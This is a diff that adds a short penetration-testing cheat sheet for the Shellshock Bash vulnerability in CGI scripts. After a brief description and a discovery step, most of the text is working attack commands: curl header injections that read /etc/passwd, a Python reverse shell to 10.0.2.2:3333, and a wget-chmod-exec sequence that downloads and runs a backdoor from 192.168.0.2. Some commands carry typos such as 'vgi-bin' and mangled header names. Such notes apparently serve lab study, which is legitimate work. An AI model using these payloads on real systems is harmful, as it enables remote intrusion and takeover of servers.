@@ -1,0 +1,26 @@
+Shellshock:(CVE-2014-6278/6271)
+==========
+This vulnerability in Bash allows remote code execution without confirmation. 
+Requirements:
+	This vulnerability affects web servers utilizing CGI (Common Gateway Interface), which is a system for generating dynamic web content. This usually involved directories such as /cgi-sys, /cgi-mod, /cgi-bin, etc.
+	.sh/.cgi/.pl script in /cgi-bin/ or /cgi-mod or /cgi-sys
+Discovery:
+	use gobuster with -s 403 and see if /cgi-bin is present.
+		-s 403 => we are sometimes not allowed access to see the directory, but we can see the files inside it.
+	then look for any scripts present in it.
+Testing:(using cURL)
+	curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'hi world of exploits'" http://localhost:8080/cgi-bin/shellshock_test.sh
+		we will see "hi world of exploits"
+	curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/shellshock_test.sh
+		print /etc/passwd
+Exploitaion to get a Reverse Shell:
+	Using cURL:
+		curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
+	Using cURL and msfvenom:
+		Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “wget http://192.168.0.2/backdoor -O /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+		Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “chmod +x /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+		Curl -l -H ‘User:Agent: () { :;}; /bin/bash -c “exec /tmp/backdoor”’ http://192.168.0.3/vgi-bin/cgi_script.cgi
+	shellshock.py:
+		https://github.com/zalalov/CVE-2014-6271
+		python shellpoc.py 10.10.10.101 /cgi-bin/status 10.10.10.1/4444
+
